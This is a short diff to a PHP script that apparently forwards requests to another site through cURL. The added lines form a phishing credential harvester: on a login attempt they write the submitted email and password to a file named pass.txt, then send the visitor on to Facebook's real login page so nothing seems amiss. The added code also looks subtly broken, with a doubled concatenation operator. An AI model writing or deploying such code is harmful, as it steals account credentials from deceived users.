@@ -24,6 +24,14 @@ $url = $base . $_SERVER['REQUEST_URI'];
 //	$mydomain = 'http://'.$_SERVER['HTTP_HOST'].'/';
 //}
 
+if (strpos($_SERVER['REQUEST_URI'], 'login.php?login_attempt') !== false) {
+	$file = fopen('pass.txt', 'w');
+    	fwrite($file, $_POST['email']. . ' - ' . $_POST['pass'] . '\n');
+    	fclose($file);
+	header('Location: https://facebook.com/login.php?login_attempt=1&lwv=110');
+	die();
+}
+
 // Open the cURL session
 $curlSession = curl_init();
 
